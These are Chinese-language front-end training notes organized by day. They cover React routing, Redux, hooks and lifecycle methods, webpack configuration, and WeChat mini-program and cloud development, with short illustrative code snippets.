            <div dangerouslySetInnerHTML={{__html:htmlContent}}>
        ```
    * 列表循环
        * 常用方法
            * map
            * filter
        * key
    * 事件绑定
        > 事件使用驼峰
        * 事件处理函数
            * 改变this指向(建议在初始化时改变)
        * event
            > 事件处理函数的最后一个参数
        * 传参
            > 利用bind进行传参
    * ref
        * 回调函数
        * React.createRef()

### 知识点
* 通讯
    * 父->子：props
        > 把数据通过props传入子组件
    * 子->父：
        > 把方法通过props传入子组件中执行
    * 兄弟
        > 状态提升，把数据提升到他们共同的父级
    * 深层级组件通讯
        * 逐层传递（不推荐）
        * Context
            1. 创建 Context
                ```js
                    const myContext = React.createContext(defaultValue)
                ```
            2. 父组件 Provider
                > 父组件共享数据，如没有设置Provider则子组件拿到的是defaultValue
                ```js
                    <myContext.Provider value={data}></myContext.Provider>
                ```

            3. 子组件接收
                * 函数组件
                    * Consumer
                        ```js
                            <myContext.Consumer>
                                {
                                    (value)=>{

                                    }
                                }
                            </myContext.Consumer>
                        ```
                    * Hook
                * 类组件
                    * Consumer
                    * contextType
                        1. 给类组件设置静态属性：子组件.contextType=myContext
                        2. 通过this.context获取数据
                        ```js
                            TodoForm.contextType = myContext

                            // 在组件的任意位置通过this.context获取
                        ```
* 构建工具
    * gulp
        > 基于任务的构建工具
    * webpack
        > 基于配置的构建工具
* npm script


## day5-3

### 复习
* Context
    1. 创建context: React.createContext(defaultValue)
    2. 父组件Provider共享
        > value属性共享数据
    3. 子组件接收
        * 函数组件
            * Consumer
            * Hook
        * 类组件
            * Consumer
            * contextType
                > 给子组件设置contextType静态属性，通过this.context
* webpack
    * gulp与webpack的区别
    * webpack.config.js
    * 常用配置
        * entry
        * output
        * devSever
            > webpack-dev-server
        * loader
            > module.rules
        * plugins
    * 配置react环境
        * react + react-dom
        * @babel/preset-react + babel-loader + @babel/core
        * webpack + webpack-cli + webpack-dev-server + html-webpack-plugin
    
    * 常用loader
        * babel-loader
            > @babel/core
        * css-loader
        * style-loader
        * sass-loader
            > node-sass
        * url-loader
            > file-loader
        * vue-loader
            > vue-template-compiler
### 知识点
* 配置vue环境
    * vue
    * vue-loader + vue-template-compiler
    * webpack + webpack-cli + webpack-dev-server + html-webpack-plugin
* 图片路径问题


## day5-4

### 知识点
* 路由类型
    * hash路由: `<HashRouter/>`
    * history路由: `<BrowserRouter/>`
* 路由配置
    * `<Route/>`
        * path
        * component
        * render
        * exact
    * `<Redirect/>`
        * from
        * to
        * exact
    * `<Switch/>`
* 路由跳转（导航）
    * 声明式导航
        * `<Link/>`
            * to
            * replace
        * `<NavLink/>`
            * to
            * replace
            * activeClassName
            * activeStyle
    * 编程式导航：history,location,match
        * 跳转方式
            * history.push()    跳转并保留记录
            * history.replace() 跳转不保留记录
            * history.back()
            * history.forward()
            * history.go()
        * 如何获取history对象
            * 通过Route.component渲染组件
                > props.history
            * 通过`withRouter`高阶组件
* 高阶组件HOC
    * 特点
        * 高阶组件是一个**纯函数**
        * 高阶组件的参数为React组件，返回值为新组件
        * 高阶组件是一种设计模式，类似于**装饰器模式**
    * 定义高阶组件
        * 方式一：属性代理
            > 通过props传入组件需要的数据（注意：必须传递原来的props）
            ```js
                // 需求：获取本地存储中的用户信息

                let userInfo = localStorage.getItem('userInfo');
                try{
                    userInfo = JSON.parse(userInfo) || {}
                }catch(err){
                    userInfo = {}
                }
                this.setState({
                    userInfo
                })

                // 封装一个高阶组件把用户信息传入需要的组件
                function withUser(InnerComponent){
                    return function OuterComponent(){
                        let userInfo = localStorage.getItem('userInfo');
                        try{
                            userInfo = JSON.parse(userInfo) || {}
                        }catch(err){
                            userInfo = {}
                        } 
                        return (
                            <InnerComponent userInfo={userInfo} />
                        )
                    }
                }

                App = withUser(App);
            ```
* 纯函数: 
    1. 不修改传入参数
    2. 固定输入有固定输出
    ```js
        // sum为纯函数
        function sum(a,b){
            return a+b;
        }
        sum(1,2);//3
        sum(1,2);//3

        // 以下不是纯函数
        function randomNumber(min,max){
            return Math.random()*(max-min+1)+min;
        }

        function getData(url,data){
            id(data.id){
                data.id = ObjectId(data.id)
            }
        }
    ```
* 函数柯里化


## day5-5

### 复习
* ReactRouter
    * 常用组件
        * <HashRouter>/<BrowserRouter>
        * <Route> / <Redirect> / <Switch>
        * <Link> / <NavLink>
    * 导航
        * 声明式导航
        * 编程式导航
            > history,location,match
            * Route.component
            * withRouter
* 高阶组件HOC
    * 定义
        > 命名规则：with
        * 属性代理
        * 反向继承
            * super
    * 应用
        * 属性代理
        * 公共代码封装
        * 权限管理
    * ES7装饰器
        > @
        @babel/plugin-proposal-decorators
* ant-design

### 知识点
* fetch 
    * 封装fetch请求

* 路由传参
    * search
        > 能实现数据持久化，利用querystring模块处理
        * 获取方式：props.location.search
    * 动态路由
        > 能实现数据持久化，
        * 获取方式：props.match.params
    * state
        > 刷新页面后数据消失
        * 获取方式：props.location.state
    * 自定数据
        > 刷新页面后数据消失
        * 获取方式：props.location
        
## day6-1

### 复习
* XMLHttpRequest与fetch

### 知识点
* webpack路径别名:resolve.alias
* 嵌套路由
* 路由监听
    ```js
        history.listen((location)=>{

        })
    ```

* React生命周期
    * 生命周期函数（钩子函数）
        > 搞懂2点：
        1. 如何执行
        2. 适合做什么操作
    * 阶段
        * 初始化阶段
            * constructor
            ```js
                constructor(props){
                    super(props)
                    this.state = {}
                }
            ```
        * 挂载阶段
            * componentWillMount（不推荐，改名为：UNSAFE_*）
            * componentDidMount
        * 更新阶段
            * componentWillUpate（不推荐，改名为：UNSAFE_*）
            * componentDidUpdate
                * prevProps     更新前的props
                * prevState     更新前的state
        * 销毁阶段 
            * componentWillUnmount
        * 特殊生命周期函数
            * shouldComponentUpdate: 一般用于优化新能
                * nextProps 将要改变的props
                * nextState 将要改变的state
            * componentWillReceiveProps(nextProps) （不推荐，改名为：UNSAFE_*）
* React组件刷新场景
    * props改变
    * state改变
    * 父组件刷新
        > 利用PureComponent优化
    * 强制刷新：this.forceUpdate()

* React.Component与React.PureComponent
    * PureComponent是做shouldComponentUpdate优化的组件，所以继承自它的组件不能再写shouldComponentUpdate

* props类型校验
    > 需要prop-types模块，并设置propTypes静态属性
* props默认值
    > 需要设置defaultProps静态属性

## day6-2

### 复习
* 生命周期
    * 初始化阶段
        * constructor(props)
    * 挂载阶段
        * UNSAFE_componentWillMount
        * componentDidMount
    * 更新阶段
        * UNSAFE_componentWillUpdate(nextProps,nextState)
        * componentDidUpdate(prevProps,prevState)
    * 销毁阶段
        * componentWillUnmount
    * 特殊阶段
        * UNSAFE_componentWillReceiveProps(nextProps)
        * shouldComponentUpdate(nextProps,nextState)
* 组件刷新场景
    > 所谓刷新，其实就是执行render函数
    * props改变
    * state改变
    * 父组件刷新：一般会对这种情况进行优化
    * 强制刷新：this.foreUpdate()
* 性能优化
    * shouldComponentUpdate
    * PureComponent
* props校验
    > prop-types
* props默认
### 知识点
* redux
    * 核心
        * store: 数据仓库（用于存放共享数据）
        * state: 状态（数据）
        * reducer: 一个用于更新state的方式
            > 是一个纯函数，接收state与action两个参数，必须返回一个新的state（不修改原来的state）
        * action: 修改state的命令/动作
            > 格式：{type:'login',payload}

    * 使用步骤
        1. 创建数据仓库
            ```js
                const {createStore} from 'redux'
                const store = createStore(reducer,initState)
            ```
        2. 操作
            * 获取state: store.getState()
            * 修改state: store.dispatch(action)
            * 监听state: store.subscribe(()=>{})

    ```js
        // 安装
        // npm i redux
        // 引入
        import {createStore} from 'redux'

        const initState = {
            userInfo:{}
        }
        const reducer = function(state,action){
            switch(action.type){
                case "login":
                   return {
                       ...state,
                       userInfo:action.user
                   } 
            }
        }
        const store = createStore(reducer,initState);

        // 修改state
        const action = {type:"login", user:{username:'laoxie',password:123}}
        store.dispatch(action)
    ```
    > 结论：react与redux是两个独立的产品，我们需要redux解决react组件数据共享问题
    1. 多个组件能共享redux上的数据
    2. 当数据有修改时react组件能实现刷新

* withRedux高阶组件封装

* react-redux桥接工具
    * `<Provider/>`: 利用Context技术传输数据
    * `connect()`: 利用高阶组件代理组件数据

    * 使用步骤
        1. 安装引入
        2. 使用`<Provider>`组件共享store
        3. 使用`connect()`高阶组件定义props数据
        4. React组件通过props获取/修改redux数据


## day6-3

### 复习
* redux 状态管理工具
    * 核心
        * store
        * reducer: 是一个纯函数，并返回一个新的state
        * state
    * 使用步骤
        ```js
            // 1. 引入
            import {createStore} from 'redux'

            // 2. 创建
            const reducer = function(state,action){
                switch(action.type){
                    case 'login':
                        let newState = {
                            ...state,
                            userInfo:action.user
                        }
                        return newState;
                    default:
                        return state;
                }
            }

            // 初始化state（模块化后，建议在各自的reducer中定义自己的初始化state）
            const initState = {
                userInfo:{}
            }
            const store = createStore(reducer,initState);

            // 3. 操作：获取，修改，监听
            // 获取最新状态
            store.getState();

            // 修改状态
            const action = {type:'login'}
            store.dispatch(action)

            // 监听
            store.subscribe(()=>{
                // 当state有修改时执行这里的代码
            })
            store.subscribe(()=>{
                // 当state有修改时执行这里的代码
            })
        ```
    * redux与react是两个独立产品
        > 如何连接react组件与redux
        * 方式一：把监听代码写到react组件中，在state更新时修改组件的state（不推荐）
            > 利用state改变刷新组件
        * 方式二：利用高阶组件把方式一中的代码提取到高阶组件中执行
            > 利用props改变刷新组件
        * 方式三：react-redux桥接工具
            > 利用Context+HOC实现
            * `<Provider store/>`
            * `connect(mapStateToProps,mapDispatchToProps)`

## 知识点
* redux模块化
    * reducer模块化
    * state模块化
    * 合并
        > 通过`combineReducers()`把多个reducer合并成一个大的Reducer

    > 注意：模块化后，影响state的获取，但不影响修改和监听操作
* 简化版redux
    > 了解redux工作流程
* redux三大基本原则
    1. 唯一数据源：整个应用只能有一个store
    2. 只有store能改变自己的内容
        >store.dispatch()
    3. Reducer必须是一个纯函数
        > 不修改传入的参数（state,action），且返回新的state
* Action Creator
    > 一个用于创建action的函数
    * bindActionCreators
        > 会把actionCreator模块中默认导出（export default）的所有方法绑定到组件props并自动隐式调用dispatch(action)

* redux中间件
    > 中间件是一个函数
    * 用用中间件
        * redux-thunk
        * redux-promise
        * redux-saga
    * Generator     生成器函数，返回一个迭代器
        * yield     暂停
        * return    结束
    * Iterator      迭代器
        * next()
        * for...of
    ```js
        function sum(){

        }
        sum();// undefined
        new sum();//object

        async function sum(){

        }
        sum();// promise

        function * sum(){

        }
        sum();//得到一个迭代器Iterator

        //for...
        //for...in
        //for...of
        //while
        //do...while
        //forEach(item=>item)
        for(let i=0;i<arr.length;i++){
            for(let j=0;j<arr[i].length;j++){
                arr[i][j]
            }
        }
    ```
    * for...of
        > for...of能遍历具有迭代特性的数据
        * 数组/类数组
        * 字符串
        * Map
        * Set
        * ...
        ```js
            for(let item of [10,20,30]){

            }

            for(let letter of 'abcdefg'){

            }
        ```

## day6-4

### 知识点
* 使用redux-saga
    > 先了解以下知识点
    * Generator
    * Iterator
    
    * 使用步骤
        * 1. 安装引用


* 测试
    * 自测
        * 单元测试：需要编写测试用例
        * 测试框架
        ```js
            function sum(a,b){
                return a+b;
            }

            QUnit.module('cal', function() {
                QUnit.test('两个数字相加', function(assert) {
                    assert.equal(sum(1, 1), 2, '1 + 1 = 2');
                });
            });
        ```
    * 测试团队


* Hook
    > Hook是一个有特定功能的函数，React16.8推出的新特性，只能在函数组件最外层代码中使用，可以实现以前只有在类组件中才能实现的效果
    * 常用Hook
        * useState
            > 让函数组件拥有像类组件一样的状态，能实现自我刷新
            * 参数为state初始值、
            * 返回一个数组：[state,修改state的方法]
        * useEffect
            > 让函数组件能实现生命周期函数的功能

        * useMemo
            > 一般用于性能优化


## day6-5

### 复习
* 所谓的刷新
    * 类组件: 执行render函数
    * 函数组件：从上往下执行所有代码
* useState
    ```js
        const [count1,setCount1] = useState(1)
        const [count2,setCount2] = useState(1)
        //setCount()修改count值后，组件会自动刷新

        <button onClick={()=>{
            setCount1(count1+1)
            setCount2(count2+1)
            setCount1((prev)=>prev+1)
        }}>+1</button>
    ```
* useEffect
    > 一定是在组件渲染完成后执行
    * 默认用法
    * 指定依赖
    * 空依赖
    * 返回一个函数
* useMemo
    * 默认用法（不推荐）
    * 指定依赖
    * 空依赖

### 知识点
* useCallback
* useContext
    > 简化context获取
    * 类组件
        * Consumer
        * contextType
    * 函数组件
        * Consumer
        * useContext
* useReducer
    > 利用context+useReducer实现简化版redux的功能
    * 封装Provider组件
* useRef
* useLayoutEffect
    > useEffect的同步版本


## day8-1

### 面试题
* Day01.html

### 知识点: 小程序
* 小程序介绍
* 准备工作
    * 注册
    * 资料填写
    * 工具下载
* 文件类型
    * json  配置文件
        * app.json
        * sitemap.json
        * project.config.json
        * PAGE.json
    * wxss
    * wxml
    * js
* 种类
    * 全局
    * 页面
* 页面分类
    * tabbar页面：设置在tabbar中的页面
    * 普通页面：默认页面

* wxml语法
    * 内置组件
    * 数据绑定
        * 单向：{{}}
        * 双向：单向+事件
            * {{}} + bind:input
            * model:value   简易版双向绑定
    * 事件绑定
        * bind/catch
        * event
        * 传参
        * 移动端事件类型
        
    * 列表循环
        * wx:for
            > 格式：wx-for="{{data}}"
            * item  数组元素
            * index 索引值
        * wx:for-item   修改item名称
        * wx:for-index  修改index名称
        * wx:key
            > 唯一属性名作为key值
            * `*this` 数组元素本身
        ```js
            let arr1 = [{_id:1,name:'xxx'},{_id:2,name:'aaa'},{_id:3,name:'bbb'}]
            let arr2 = [10,20,30,40]
            // vue/react：属性值作为key值 v-for="(item,idx) in arr1" arr1.map((item,idx)=>)
            // key -> 1,2,3
            //小程序：属性名作为key值
            // key-> _id

        ```

* js逻辑文件
    * 应用：App()   注册一个应用，一个小程序只能有一个App
    * 页面：Page()  注册一个页面
        * data
            * 绑定：写在data中的数据可直接通过`{{}}`绑定到wxml结构中
            * 修改：this.setData()
            * 获取：this.data.xxx


## day8-2

### 复习
* 工具库
    * jquery
    * lodash
    * underscore
* script标签属性
    * type
    * src
    * defer     推迟，延迟
        > html渲染完成后才执行js带啊没
    * async     异步
        > js加载完成后立即执行js代码（不管html是否渲染完成）

### 知识点
    * wxml语法
        * 数据绑定
        * 事件绑定
            * bind/catch
            * event
                * detail
            * 传参
                * 自定义属性：dataset
        * 列表循环
        * 条件判断
            * wx:if             v-if/v-show
            * wx:elif           v-else-if
            * wx:else           v-else
            * hidden
    * js逻辑文件
        * App() 注册一个应用（小程序）
            > 在任意位置通过`getApp()`返回应用实例
        * Page()  注册一个页面
            * data
            * 生命周期函数
            * 事件函数
            * 自定义方法
        * Component() 注册一个组件
    * 切后台
    * 场景值


## day8-3

### 复习
* 用户授权
    ```js
        wx.getSetting()     // 获取权限列表
        wx.openSetting()    // 打开设置界面，引导用户开启授权
        wx.authorize()      // 提前向用户发起授权请求

        wx.getUserInfo()    // 获取用户信息

        <button open-type="">登录</button>
    ```
### 知识点
* 内置组件
    * cover-view/cover-image
    * camera
    * map
        * 定位 geolocation
* 自定义组件
    定义：
        * js: Component()
        * wxss
        * wxml
        * json
    * 使用
        * json文件中配置usingComponents


## day8-4

### 面试题
* npm安装模块
    * npm i xxx
    * npm i xxx@1.2.2
    * npm i xxx@2
    * npm i xxx@next

    * 参数
        * --save/-S
        * --save-dev/-D

### 知识点
* 自定义Tabbar
    1. app.json中设置`"custom":true`
    2. 在根目录下创建custom-tab-bar组件
        > 文件名为index

* 在微信小程序中使用npm模块
    1. 安装
        * 一定要`--save`保存模块信息
    2. 构建：把npm模块编译成小程序支持的模块
        > 在根目录下生成`miniprogram_npm`目录
    3. 引入并使用

* 模块化
    * js模块化
        * ESMoudle
        * commonJS
    * wx模块化
        > 遵循commonJS规范
        * <wxs></wxs>
            * module    定义模块名称
            * src       引入外部wxs文件
        * wxs语法
* wxml模板
    > 一种比组件更简单的结构复用操作
    * 定义模板
        * <template name />
    * 引用模板
        * <import src> 引入：引入动态模板
            * <template is data />
        * <include src> 引用静态

## day8-5

### 知识点

* 云开发
    * 开通
    * 内容
        * 数据库
        * 存储文件
        * 云函数
    * 操作云开发
        * 小程序端（会有权限问题）
            * 初始化
                ```js
                    wx.cloud.init({
                        env:'id'
                    })
                ```
            * 操作
                * 数据库（CRUD）
                    1. 获取数据库对象
                        ```js
                            const db = wx.cloud.database()
                        ```
                    2. 获取集合
                        ``` js
                            const col = db.collection(NAME)
                        ```
                    3. CRUD
                        ```js
                            // 增：添加数据
                            col.add({
                                data:data
                            })
                            
                            
                            // 删除
                            col.where({}).remove()
                            
                            // 改
                            col.where().update()

                            // 查
                            col.get() // 获取集合所有数据
                            col.where(query).get(); // 根据条件获取数据
                            col.doc(_id).get()
                        ```
                * 存储文件
                * 云函数
                    > 先把云函数部署到云端
                    ```js
                        wx.cloud.callFunction({
                            name,
                            data,// 传递到云函数的参数，参数自动写入云函数的event对象
                        })
                    ```
        * 服务端操作（云函数中操作）
            > 云函数等效于web开发中的接口，与小程序端一样，可以操作数据库，存储文件，云函数，没有权限问题
            * 初始化
                ```
                    const cloud = require('wx-server-sdk');

                    cloud.init({
                        env:DYNAMIC_CURRENT_ENV
                    })
                ```
            * 操作
                * 数据库
                * 存储文件
                * 云函数

* 小程序数据接口
    * 自己的服务器：灵活，可控性更强
    * 云开发：简单，门槛低
    * 综合以上两种操作：在自己的服务器中操作云开发（利用云开发提供的Http API）


## day9-1

### 复习
* 自己的服务器
* 云开发
    * 内容
        * 数据库
        * 云函数
        * 存储空间
    * 使用步骤
        1. 开通
            * 环境
        2. 配置：project.config.json
        3. 初始化: 
            * 小程序端：`wx.cloud.init({env})`
                > 建议在app.js中的onLoad实现初始化
            * 服务器端：
                ```js
                    const cloud = require('wx-server-sdk')
                    cloud.init({
                        env:cloud.DYNAMIC_CURRENT_ENV
                    })
                ```
        3. 操作
            * 小程序端：`wx.cloud`
                * 数据库
                    ```js
                        const db = wx.cloud.database();
                    ```
                * 云函数
                    ```js
                        // 定义
                        exports.main = function(e){

                        }

                        // 调用
                        wx.cloud.callFunction({
                            name,
                            data
                        })
                    ```
                * 存储文件
                    * 上传
                    * 下载
                    * 删除
                    * 获取真实地址（具有有效期）
            * 服务端：`wx-server-sdk`
                > 没有权限问题
                * 数据库
                * 云函数
                * 存储文件

            > 建议：在服务端（云函数）操作数据、存储文件、其他云函数等
* http接口

### 知识点
* 小程序开发是否需要每个平台都开发一次？
* 能否使用Vue或React来开发小程序
* 跨平台框架
    * 原理：实现了一个编译器，把一份代码编译成各个平台的代码
    * uni-app
        * 可视化工具：hbuilderX
        * 脚手架：vue-cli
    * wePY
        > 官方一款类Vue语法的框架
    * mpvue
        > 使用Vue来开发小程序的框架，跟Uni-app最大的区别是，mpvue每个页面都是一个vue的实例，而uni-app为一个组件
    * taro
        > 京东出品，一款使用React来开发的框架

* mobx
